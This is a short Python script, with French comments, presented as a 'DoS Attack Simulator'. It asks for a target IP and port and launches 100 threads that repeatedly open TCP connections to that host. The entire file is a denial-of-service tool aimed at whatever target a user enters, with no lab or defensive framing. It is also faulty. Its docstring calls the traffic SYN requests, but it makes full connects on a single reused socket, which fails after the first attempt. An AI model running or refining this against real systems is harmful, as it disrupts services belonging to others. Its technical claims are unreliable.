import socket
import threading
import os

def attack(target_ip, target_port):
    """Envoie des requêtes SYN à l'adresse IP et au port spécifiés."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    
    try:
        while True:
            sock.connect((target_ip, target_port))
            print(f"Sent a request to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Attack failed: {e}")

def main():
    print("=== DoS Attack Simulator ===")
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    
    # Créer plusieurs threads pour simuler l'attaque
    for i in range(100):  # Nombre de threads
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    main()
